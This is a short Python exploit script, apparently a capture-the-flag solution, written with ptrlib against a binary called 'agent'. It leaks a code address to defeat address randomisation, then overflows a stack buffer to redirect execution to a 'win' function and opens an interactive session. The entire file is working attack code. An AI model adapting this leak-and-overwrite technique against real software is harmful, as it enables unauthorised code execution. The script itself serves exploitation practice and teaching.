from ptrlib import *

elf = ELF("../dist/agent")
libc = ELF('../dist/libc-2.31.so')

#io = Socket("localhost", 30005)
io = Process("../dist/agent")

#input()
io.sendlineafter("Name > ", "N"*0xf)
io.sendlineafter("Words > ", "W"*0xff)
io.sendlineafter("Age > ", "256")
io.sendlineafter("Job > ", "J" * (0x10 - 3) + "END")

# leak text addr
io.recvuntil("END")

text_addr = io.recvline()
text_addr = u64(text_addr)
elf.base = text_addr - 0x12c9

payload = b"A" * 0x40

# align stack
payload += p64(elf.symbol('win') + 5)

io.sendlineafter("> ", '4')
io.sendlineafter("> ", payload)
io.interactive()
